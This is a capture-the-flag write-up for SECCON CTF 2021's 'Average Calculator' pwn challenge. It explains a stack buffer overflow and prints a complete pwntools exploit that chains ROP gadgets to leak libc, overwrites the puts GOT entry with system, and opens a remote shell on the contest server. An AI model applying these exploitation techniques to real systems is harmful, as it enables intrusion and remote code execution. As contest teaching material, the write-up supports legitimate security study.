# SECCON CTF 2021

## Average Calculator

> 129
>
> Average is the best representative value!
> `nc average.quals.seccon.jp 1234`
>
> Author: kusano
Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _rop_ _got-overwrite_

## Analysis

### Checksec

```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### File command output

```bash
    ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

So we are given a binary with no PIE and no canary. In this conditions we can think of trying a simple buffer overflow or/with Return from oriented programing. Also, as it is dynamically link, we will need to leak libc base adress in order to call either gadjets or libc functions.

## Finding the vulnerability

```c
int main()
{
    long long n, i;
    long long A[16];
    long long sum, average;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("n: ");
    if (scanf("%lld", &n)!=1)
        exit(0);
        
    for (i=0; i<n; i++)
    {
        printf("A[%lld]: ", i);
        if (scanf("%lld", &A[i])!=1)
            exit(0);
        //  prevent integer overflow in summation
        if (A[i]<-123456789LL || 123456789LL<A[i])
        {
            printf("too large\n");
            exit(0);
        }
    }

    sum = 0;
    for (i=0; i<n; i++)
        sum += A[i];
    average = (sum+n/2)/n;
    printf("Average = %lld\n", average);
}
```

As we can see, the for loop runs n times without any array bounds check whatsoever. Furthermore, we provided de n value. That means we can right outside de buffer. We have just found our vulnerability!!!!
However, when we start writing outside the buffer, trying to reach rip, we will overwrite the n value. We need to be carefull with that, since it might cause the loop to end earlier than expected! There's another detail worth mentioning, the program checks if the value written to A[i] is valid (in this case, valid means -123456789 < A[i] < 123456789). To bypass this, we will have to be creative, but we'll get to it latter.
Last but not least, we risk overwriting the loop's i variable with our buffer overflow, thus we need to be carefull with that one as well.

## Exploit

After some trial and error, I was able to conclude that the n value is stored immediately after the buffer (that is A[16]) and the i is stored a little further down, A[19]. Having said that, we just need to watch for those specific writes and we should be good.

```python
#!/usr/bin/env python3
from pwn import *
from binascii import hexlify
from struct import * 
import os
context(arch="amd64", os="linux")
binary_path = "./average"
binary = ELF(binary_path)

SERVER = "average.quals.seccon.jp"
PORT = 1234
local = True 
if(len(sys.argv) > 1 and "-remote" == sys.argv[1]):
    local = False

if local:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io = process(binary_path,timeout=9999)
else:
    libc = ELF("./libc.so.6")
    io = remote(SERVER, PORT, timeout=9999)
```

This is a standard pwntools header.
Now to leak libc base address, we need to call puts with puts adress as an argument and return to main for a second run. However this time we will know the libc base adress and the exploitation will be a simple ret2libc.

```python
def overflow(exec = 1):
    numbers = [i for i in range(1,101)]
    k = 0
    i = 0
    while(k < n):
        if(i == 16):
            io.sendline(bytes(str(n),"ASCII"))
        elif(i == 19):
            io.sendline(bytes(str(k),"ASCII"))
        else:
            if(k == 21):
                if(exec == 1):
                    io.sendline(bytes(str(0x00000000004013a3),"ASCII")) 
                    io.sendline(bytes(str(binary.got.puts),"ASCII")) 
                    io.sendline(bytes(str(binary.plt.puts),"ASCII")) 
                    io.sendline(bytes(str(binary.sym.main),"ASCII")) 
                    k += 3
                else:
                    k += setup(binary.bss(0x100))
            elif(k == 27 and exec !=1):
                k += setup(binary.got.puts)
            elif(k == 33 and exec != 1):
                io.sendline(bytes(str(0x00000000004013a4),"ASCII"))
                io.sendline(bytes(str(0x00000000004013a3),"ASCII"))
                io.sendline(bytes(str(binary.bss(0x100)),"ASCII"))
                io.sendline(bytes(str(binary.plt.puts),"ASCII"))
                k += 3
            else:
                io.sendline(bytes(str(numbers[k]),"ASCII"))
        k += 1
        i = (i+1) % 20   
```

This my exploit's main function. Since we are on the first run of main, we will look at what happens when variable exec (short for execution) is 1 (its default value). My while loop will run as many times as n (the n value from the binary that I mentioned above), so each iteration writes on buffer's A[k]. I figgured out that writing on A[21] overwrites the rip, and gives us control over the code execution. To correctly call puts with the arguments that we want, we will have to rely on one of the gadjets mentioned bellow.
Note: the variable i is used to account for the loop's i and n overwrites, allowing to continuously write on the buffer.

```python
0x00000000004013a3 : pop rdi ; ret

0x00000000004013a1 : pop rsi ; pop r15 ; ret
```

Since the argument passed to put goes in rdi register, we will use the first gadjet (we will discuss the second one later). Keeping that in mind, we set up the puts call by giving puts its on adress and the adress of main to return for the second run. Having dealt with libc, we move on to the second run of main.

For the second run, we will use a simular logic. Only this time, we will try to call system('/bin/sh) to get our shell. The verification that I mentioned early, will block us from writting directly on the stack using our buffer overflow (as system adress >123456789, thus causing the binary to call exit). Note that in the second run the exec variable will be equal to 2 (to make sure that it won't execute the same code as before).

After thinking for a while, I came to the conclusion that I can use scanf (in the binary corresponds to the symbol __isoc99_scanf), to overwrite the got entry for puts with system address. This way, we can call puts with '/bin/sh' and get out shell. Since, we will need to write /bin/sh in memory and perform the got overwrite, I wrote a function to ease the process.

```python
def setup(memory):
    adress = [0x00000000004013a1,0,1,0x00000000004013a3,0x0000000000402008,0x401070]
    adress[1] = memory
    for i,number in enumerate(adress):
        io.sendline(bytes(str(number),"ASCII"))
    return i  
```

Looking at the disassembled code for the scanf call (I used gdb for this part), we can note that scanf takes two arguments: the format string in rdi and the memory place to store the value that was read in rdi. Setting up rdi is easy, we have done that before. To set up the rsi, we will rely on the second gadjet that ROPgadjet gave us. This function simply sends the adresses to call those gadjets and in the end calls scanf.
Taking a look into my overflow function for the second run, it is worth mentioning that it also writes /bin/sh in the bss section + 0x100 (to give stack room for the system function).
After having everything set up, we call the pop rdi gadjet one last time, to set it to the adress of /bin/sh, and call system. We should have a shell by now!!!
Note: I decided to use the same format string as the binary, not only because that adress can be found easily using gdb, but also, because it reads a long long integer (which is exactly what we need). Finally, every 6 writes on the buffer A, we write the return value of the function that we call, hence my exploit if's are distance by 6.

```python
n = 25
io.sendline(bytes(str(n),"ASCII"))
overflow()
io.recvuntil(b'Average')
io.recvline()
leak = io.recv(6)
libc.address  = u64(leak+ b'\0\0') - libc.sym.puts
log.info(f"libc adress: {hex(libc.address)}")
n = 37
io.sendline(bytes(str(n),"ASCII"))
overflow(2)
io.sendline(str(int('0x' + hexlify(b'//bin/sh'[::-1]).decode(),16)).encode())
io.sendline(bytes(str(libc.sym.system),"ASCII"))
io.recvuntil(b'Average')
io.recvline()
io.sendline(b"cat flag.txt")
io.interactive()
```

This is just the end of my exploit, where we just send the n values for both runs, calculate the libc base adress with the leaked value and get the flag.

```bash
[+] Opening connection to average.quals.seccon.jp on port 1234: Done
[*] libc adress: 0x7fae08385000
[*] Switching to interactive mode
SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}
```

Remember that this is one of many possible solutions.
